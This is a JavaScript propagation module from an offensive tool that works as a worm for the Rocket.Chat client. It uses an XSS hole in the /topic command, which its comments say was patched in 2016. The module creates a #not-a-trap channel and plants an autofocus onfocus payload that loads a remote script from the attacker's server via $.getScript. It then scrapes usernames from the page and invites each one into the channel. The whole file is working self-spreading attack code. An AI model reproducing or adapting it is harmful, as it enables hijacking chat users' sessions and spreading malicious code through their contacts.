"use strict";

/*
 * This modules spreads using a XSS vulnerability in /topic,
 * which was patched in October of 2016.
 * 
 * This is a SUPER-hacky propagation module btw, so don't judge.
 * 
 */

define({

    // User their jQuery to chain load our script
    payload:  '$.getScript("' + __ld_server + '/js/little-doctor.js")',

    propagate: function() {
        if (navigator.userAgent.indexOf("Rocket.Chat") > -1) {
            console.log('Starting RocketCat propagation module');
            this.infectChannel();
        }
    },

    infectChannel: function() {
        this.sendMessage('/create #not-a-trap', 1);
        this.sendMessage('/open #not-a-trap', 1);
        this.sendMessage('/topic NOT-A-TRAP<input onfocus="' + payload + '" autofocus="autofocus">', 250);
        var users = this.listUsers();
        for (var index = 0; index < users.length; ++index) {
            console.log('Sending invite to: ' + users[index]);
            this.sendMessage('/invite ' + users[index] + ' #not-a-trap', 250);
        }
    },

    listUsers: function() {
        var userTags = document.querySelectorAll('[data-username]');
        var users = new Set();
        for (var index = 0; index < userTags.length; ++index) {
            users.add(userTags[index].getAttribute('data-username'));
        }
        console.log(users);
        return Array.from(users);
    },

    sendMessage: function(message, delay) {
        console.log('Sending message: ' + message);
        var textarea = document.getElementsByClassName('input-message')[0];
        if (textarea) {
            setTimeout(function() {
                textarea.value = message;
                $('textarea').trigger('keyup');  // Yea fuck it we'll use jQuery
                setTimeout(function() {
                    var send = document.getElementsByClassName('send-button')[0];
                    if (send) {
                        send.click();
                    } else {
                        console.log('Error: Could not find send-message');
                    }
                }, 50);
            }, delay || 10);
        } else {
            console.log('Error: Could not find input-message');
        }

    }

});